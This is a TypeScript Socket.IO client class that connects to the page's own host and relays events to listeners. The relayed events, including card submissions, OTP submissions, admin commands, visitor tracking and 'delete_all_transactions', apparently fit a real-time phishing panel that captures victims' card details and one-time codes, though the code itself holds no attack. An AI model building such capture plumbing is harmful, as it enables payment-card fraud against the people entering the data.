
import io from 'socket.io-client';

const isLocalhost = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
const protocol = window.location.protocol === "https:" ? "https" : "http";

// For production, use the same domain as the current window
const socketUrl = isLocalhost
  ? `${protocol}://localhost:8080`
  : `${window.location.protocol}//${window.location.host}`;

class WSClient {
  private listeners: { [type: string]: Array<(payload: any) => void> } = {};
  socket: any;

  constructor() {
    console.log('[WSClient] Connecting to:', socketUrl);
    
    this.socket = io(socketUrl, { 
      withCredentials: true, 
      transports: ['websocket', 'polling'], // Allow fallback to polling
      timeout: 30000, // Increased timeout 
      forceNew: true, // Force a new connection
      reconnection: true,
      reconnectionDelay: 1000,
      reconnectionAttempts: 5,
      maxReconnectionAttempts: 5
    });
    
    this.socket.on('connect', () => {
      console.log('[WSClient] Socket.IO connected with ID:', this.socket.id);
    });

    this.socket.on('disconnect', (reason) => {
      console.log('[WSClient] Socket.IO disconnected, reason:', reason);
    });

    // Add proper error handling
    this.socket.on('connect_error', (error: any) => {
      console.error('[WSClient] Socket.IO connection error:', error);
      console.log('[WSClient] Attempting reconnection...');
    });

    this.socket.on('connect_timeout', () => {
      console.error('[WSClient] Socket.IO connection timeout');
    });

    this.socket.on('error', (error: any) => {
      console.error('[WSClient] Socket.IO error:', error);
    });

    this.socket.on('reconnect', (attemptNumber) => {
      console.log('[WSClient] Socket.IO reconnected after', attemptNumber, 'attempts');
    });

    this.socket.on('reconnect_error', (error) => {
      console.error('[WSClient] Socket.IO reconnection error:', error);
    });

    this.socket.on('reconnect_failed', () => {
      console.error('[WSClient] Socket.IO reconnection failed');
    });

    // Listen for all relayed events
    const RELAY_EVENTS = [
      'card_submission',
      'admin_command',
      'otp_submitted',
      'delete_all_transactions',
      'visitor_update',
      'visitor_left',
      'start_chat',
      'chat_message'
    ];

    RELAY_EVENTS.forEach((event) => {
      this.socket.on(event, (payload) => {
        console.log(`[WSClient] Received event: ${event}`, payload);
        if (this.listeners[event]) {
          this.listeners[event].forEach((cb) => cb(payload));
        }
      });
    });
  }

  send(type: string, payload: any) {
    if (!this.socket.connected) {
      console.warn('[WSClient] Socket not connected, attempting to reconnect...');
      this.connect();
      // Wait a bit for connection before sending
      setTimeout(() => {
        if (this.socket.connected) {
          console.log(`[WSClient] Sending event: ${type}`, payload);
          this.socket.emit(type, payload);
        } else {
          console.error('[WSClient] Failed to reconnect, cannot send event:', type);
        }
      }, 1000);
      return;
    }
    
    console.log(`[WSClient] Sending event: ${type}`, payload);
    this.socket.emit(type, payload);
  }

  connect() {
    if (!this.socket.connected) {
      console.log('[WSClient] Attempting to connect socket...');
      this.socket.connect();
    }
  }

  disconnect() {
    if (this.socket.connected) {
      console.log('[WSClient] Disconnecting socket...');
      this.socket.disconnect();
    }
  }

  getSocketId() {
    const id = this.socket?.id;
    console.log('[WSClient] Current socket ID:', id);
    return id;
  }

  isConnected() {
    const connected = this.socket?.connected || false;
    console.log('[WSClient] Connection status:', connected);
    return connected;
  }

  on(type: string, cb: (payload: any) => void) {
    console.log(`[WSClient] Registering listener for ${type}`);
    if (!this.listeners[type]) this.listeners[type] = [];
    this.listeners[type].push(cb);
  }

  off(type: string, cb: (payload: any) => void) {
    console.log(`[WSClient] Removing listener for ${type}`);
    if (this.listeners[type]) {
      this.listeners[type] = this.listeners[type].filter((fn) => fn !== cb);
    }
  }
}

export const wsClient = new WSClient();
